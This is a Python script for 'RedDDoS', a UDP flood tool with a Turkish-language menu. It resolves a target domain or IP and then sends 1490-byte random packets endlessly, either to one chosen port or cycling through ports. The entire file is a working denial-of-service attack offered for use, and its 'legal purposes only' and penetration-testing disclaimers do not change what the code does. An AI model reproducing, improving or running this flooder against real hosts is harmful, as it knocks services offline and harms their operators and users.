print("RedDDoS")
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
from platform import system
from tqdm.auto import tqdm

version = "1.2"

uname = system()

if uname == "Windows":
    cmd_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)

sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

while True:
    print("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Sürüm: " + version)       
    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
    print("                       Developer:\033[91mWast\033[0m")
    print("       https://github.com/wastdev")
    print('                   Sadece yasal amaçlar için')
    print("\033[92;1m")
    print("1. Web Sitesi Alan Adı\n2. IP Adresi\n3. Hakkında\n4. Çıkış")
    print('\033[0m')

    opt = str(input("\n> "))

    if opt == '1':
        domain = str(input("Alan Adı:"))
        try:
            ip = socket.gethostbyname(domain)
        except socket.gaierror:
            print('\033[91mGeçersiz alan adı! Lütfen tekrar deneyin.\033[0m')
            time.sleep(2)
            os.system(cmd_clear)
            continue
        break

    elif opt == '2':
        ip = str(input("IP Adresi: "))
        break

    elif opt == '3':
        print("\n\033[101mKolay.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
        print("\033[101mAçık.      .افتح\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m güvenli\033[92m'.\033[0m")
        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
        print("\033[101mGüvenli.    .يؤمن\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m r \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m t \033[92m;\033[0m")
        print("                                                     \033[92m|\033[0m e \033[91m|  _ <\033[0m \033[93m\\__/\033[0m e \033[92m|\033[0m")
        print("RedDDoS Aracı, açık kaynaklı bir araçtır ve          \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
        print("sızma testleri için kullanılabilir. Ağları/sunucuları/ \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
        print("veya diğer cihazları test edebilirsiniz.              \033[92m'.\033[0m üye \033[93m<|\033[0m \033[92m.'\033[0m")
        print("                                                         \033[92m'-._____.-'\033[0m")
        print("Programın yazarı, kullanımından sorumlu değildir.")
        print("Herkes YALNIZCA yasal durumlarda kullanmalıdır.   üye-id: 'rst-00000002'")
        print("\nDaha fazla bilgi için projenin sitesini ziyaret edin.")
        
        goon = input("\n\n\n\n\n\n\nDevam etmek için Enter'a basın.")
        os.system(cmd_clear)

    elif opt == '4':
        exit()

    else:
        print('\033[91mGeçersiz Seçim!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

port_mode = False 
port = 2

while 1:
    port_bool = str(input("Belirli bir port mu? [e/h]: "))

    if (port_bool == "e") or (port_bool == "E"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "h") or (port_bool == "H"):
        break

    else:
        print('\033[91mGeçersiz Seçim!\033[0m')
        time.sleep(2)

os.system(cmd_clear)
print('\033[36;2mBAŞLATILIYOR....')
time.sleep(1)
print('BAŞLIYOR...')
time.sleep(4)

sent = 0

if port_mode == False:
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1m%s paket %s adresine %s portundan gönderildi"%(sent, ip, port))
    except:
        print('\n\033[31;1mÇıkıldı\033[0m')

elif port_mode == True:
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1m%s paket %s adresine %s portundan gönderildi"%(sent, ip, port))      
    except:
        print('\n\033[31;1mÇıkıldı\033[0m')